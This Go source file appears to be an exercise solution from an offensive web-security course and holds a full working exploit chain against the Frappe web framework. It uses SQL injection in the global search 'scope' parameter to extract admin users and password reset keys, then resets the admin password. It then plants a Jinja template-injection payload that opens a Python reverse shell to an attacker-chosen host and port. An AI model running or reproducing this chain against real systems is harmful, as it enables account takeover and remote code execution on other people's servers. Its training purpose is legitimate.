package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/tidwall/gjson"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 8.6.2.1 - Full exploit

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func getAdminUserFinal(debug bool, ip string) (bool, string) {
	requestURL := fmt.Sprintf("http://%s:8000/", ip)

	data := url.Values{
		"cmd":   {"frappe.utils.global_search.web_search"},
		"text":  {"offsec"},
		"scope": {"offsec_scope\" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#"},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	if response.StatusCode != 200 {
		return false, ""
	}

	json := response.ResponseBody
	username := gjson.Get(json, "message.0.route")
	utils.PrintSuccess("Username: " + username.String())

	email := gjson.Get(json, "message.1.route")
	utils.PrintSuccess("Email: " + email.String())

	return true, email.String()
}

func forgetPasswordFinal(debug bool, ip, email string) bool {
	requestURL := fmt.Sprintf("http://%s:8000/", ip)

	data := url.Values{
		"cmd":  {"frappe.core.doctype.user.user.reset_password"},
		"user": {email},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	json := response.ResponseBody
	message := gjson.Get(json, "message")

	if response.StatusCode != 200 || (message.String() == "not found" && response.StatusCode == 200) {
		return false
	}

	utils.PrintSuccess("Forget Password triggered...")

	return true
}

func extractResetPasswordKeyFinal(debug bool, ip, email string) (bool, string) {
	requestURL := fmt.Sprintf("http://%s:8000/", ip)

	data := url.Values{
		"cmd":   {"frappe.utils.global_search.web_search"},
		"text":  {"offsec"},
		"scope": {"offsec_scope\" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	if response.StatusCode != 200 {
		return false, ""
	}

	json := response.ResponseBody
	key := gjson.Get(json, fmt.Sprintf("message.#(doctype==\"%s\").route", email))
	utils.PrintSuccess("Password Reset Key: " + key.String())

	return true, key.String()
}

func resetPasswordFinal(debug bool, ip, key string) bool {
	requestURL := fmt.Sprintf("http://%s:8000/", ip)

	data := url.Values{
		"cmd":                 {"frappe.core.doctype.user.user.update_password"},
		"key":                 {key},
		"old_password":        {""},
		"new_password":        {"pwned12345678!"},
		"logout_all_sessions": {"1"},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	if response.StatusCode != 200 {
		return false
	}

	utils.PrintSuccess("Password changed!")

	return true
}

func createEmailTemplate(debug bool, ip, email, lhost, lport string) bool {
	requestURL := fmt.Sprintf("http://%s:8000/api/method/frappe.desk.form.save.savedocs", ip)

	sstiPayload := "{% set string = \\\"ssti\\\" %} {% set class = \\\"__class__\\\" %} {% set mro = \\\"__mro__\\\" %} " +
		"{% set subclasses = \\\"__subclasses__\\\" %} {% set mro_r = string|attr(class)|attr(mro) %} " +
		"{% set subclasses_r = mro_r[1]|attr(subclasses)() %} {% for x in subclasses_r %} " +
		"{% if 'Popen' in x|attr('__qualname__') %} " +
		fmt.Sprintf("{{ x([\\\"python3\\\",\\\"-c\\\",\\\"a=__import__;s=a('socket');o=a('os').dup2;p=a('pty').spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(('%s',%s));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p('/bin/sh')\\\"]) }}", lhost, lport) +
		"{% endif %}{% endfor %}"

	doc := fmt.Sprintf("{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 2\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"%s\",\"__newname\":\"%s\",\"subject\":\"%s\",\"response\":\"<div>%s</div>\"}", email, "SSTI", "SSTI", sstiPayload)

	data := url.Values{
		"doc":    {doc},
		"action": {"Save"},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	if response.StatusCode != 200 {
		return false
	}

	return true
}

func triggerSSTI(debug bool, ip, email, lhost, lport string) bool {
	requestURL := fmt.Sprintf("http://%s:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template", ip)

	sstiPayload := "{% set string = \\\"ssti\\\" %} {% set class = \\\"__class__\\\" %} {% set mro = \\\"__mro__\\\" %} " +
		"{% set subclasses = \\\"__subclasses__\\\" %} {% set mro_r = string|attr(class)|attr(mro) %} " +
		"{% set subclasses_r = mro_r[1]|attr(subclasses)() %} {% for x in subclasses_r %} " +
		"{% if 'Popen' in x|attr('__qualname__') %} " +
		fmt.Sprintf("{{ x([\\\"python3\\\",\\\"-c\\\",\\\"a=__import__;s=a('socket');o=a('os').dup2;p=a('pty').spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(('%s',%s));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p('/bin/sh')\\\"]) }}", lhost, lport) +
		"{% endif %}{% endfor %}"

	doc := fmt.Sprintf("{\"name\":\"SSTI\",\"docstatus\":0,\"owner\":\"%s\",\"idx\":0,\"response\":\"<div>%s</div>\",\"subject\":\"SSTI\",\"modified\":\"2023-08-31 04:35:02.869892\",\"modified_by\":\"zeljka.k@randomdomain.com\",\"doctype\":\"Email Template\",\"creation\":\"2023-08-31 04:35:02.869892\",\"__last_sync_on\":\"2023-08-31T08:44:08.016Z\"}", email, sstiPayload)

	data := url.Values{
		"template_name": {"SSTI"},
		"doc":           {doc},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies:     []*http.Cookie{},
		FormData:    data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	if response.StatusCode != 200 {
		return false
	}

	return true
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 4 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-debug=true] [-proxy=true] <target> <LHOST> <LPORT>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103 192.168.45.152 1337", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	lHost := flag.Arg(1)
	lPort := flag.Arg(2)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// cookie jar to help us manage cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalln("Error while creating cookie jar", err)
	}

	// create our HTTP client using the above transport and cookie jar, then set the global variable
	client = &http.Client{
		Transport: tr,
		Jar:       jar,
	}

	result, email := getAdminUserFinal(*debug, ip)
	if !result {
		utils.PrintFailure("Failed to get Admin user!")
		os.Exit(1)
	}

	result = forgetPasswordFinal(*debug, ip, email)
	if !result {
		utils.PrintFailure("Failed to trigger Forget Password!")
		os.Exit(1)
	}

	result, key := extractResetPasswordKeyFinal(*debug, ip, email)
	if !result {
		utils.PrintFailure("Failed to extract password reset key!")
		os.Exit(1)
	}

	result = resetPasswordFinal(*debug, ip, key)
	if !result {
		utils.PrintFailure("Failed to reset password!")
		os.Exit(1)
	}

	if createEmailTemplate(*debug, ip, email, lHost, lPort) {
		utils.PrintSuccess("Created new email template!")
	} else {
		log.Fatalln("Failed to create new email template...")
	}

	if triggerSSTI(*debug, ip, email, lHost, lPort) {
		utils.PrintSuccess("Triggered SSTI, check listener!")
	} else {
		log.Fatalln("Failed to trigger SSTI...")
	}

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
